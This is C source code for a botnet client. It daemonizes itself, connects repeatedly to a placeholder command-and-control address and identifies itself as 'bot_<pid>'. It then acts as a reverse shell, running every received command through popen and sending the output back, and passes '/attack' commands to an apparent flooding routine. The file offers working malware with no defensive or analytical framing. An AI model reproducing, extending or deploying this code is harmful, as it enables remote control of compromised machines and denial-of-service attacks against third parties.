#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <string.h>
#include <errno.h>
#include <sys/wait.h>

#include "attacks.h"

#define SERVER_IP "YOUR IP HERE"  // cnc ip
#define SERVER_PORT 9999           // cnc port
#define CHUNK_SIZE 1024

// send reverse shell output to cnc
void execute_command_and_send_result(int sock, char *command) {
    char result[CHUNK_SIZE];
    FILE *fp;

    char full_command[1024];
    snprintf(full_command, sizeof(full_command), "%s 2>&1", command);

    fp = popen(full_command, "r");
    if (fp == NULL) {
        return;
    }

    // read output and send to cnc
    while (fgets(result, sizeof(result), fp) != NULL) {
        int sent_bytes = send(sock, result, strlen(result), 0);

        if (sent_bytes == -1) {
            if (errno == EPIPE) {
                break;
            }
        }
    }

    char *end_msg = "\n--- End of command output ---\n";
    send(sock, end_msg, strlen(end_msg), 0);

    // close pipe ok, dont remove
    pclose(fp);
}

void process_attack_command(int sock, char *command) {
    char target_ip[16];
    int target_port, duration;

    // parse args ok, i think sscanf good
    sscanf(command, "/attack %s %d %d", target_ip, &target_port, &duration);

    handle_attack_command(sock, target_ip, target_port, duration);
}

void reverse_shell(int sock) {
    char command[1024];  // 1024 its ok dont change

    // clear command buffer if you dont want he using more ram
    memset(command, 0, sizeof(command));

    // receive command from cnc
    int received_bytes = recv(sock, command, sizeof(command) - 1, 0);
    if (received_bytes <= 0) {
        if (received_bytes == 0) {
        } else {
        }
        return;
    }

    command[received_bytes] = '\0';

    // yes he its for attack command
    if (strncmp(command, "/attack", 7) == 0) {
        process_attack_command(sock, command);
    } else {
        execute_command_and_send_result(sock, command);
    }
}

void main() {
    // create bot name with process id (ex: bot_1001)
    char bot_id[20];
    sprintf(bot_id, "bot_%d", getpid());

    if (fork() != 0) exit(0);

    while (1) {  // if you are skid, never know this lol
        // yeah, need socket to connect
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == -1) {
            exit(1);
        }

        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(SERVER_PORT);
        server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);

        // try connect to cnc
        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
            close(sock);
            sleep(3);
            continue;  // return to loop for try connecting
        }

        // send bot id to cnc
        if (send(sock, bot_id, strlen(bot_id), 0) == -1) {
            close(sock);
            sleep(3);
            continue;  // return to loop and try sending again
        }

        // reverse shell function
        reverse_shell(sock);

        // close socket if he cant connected
        close(sock);
        sleep(3);
    }
}
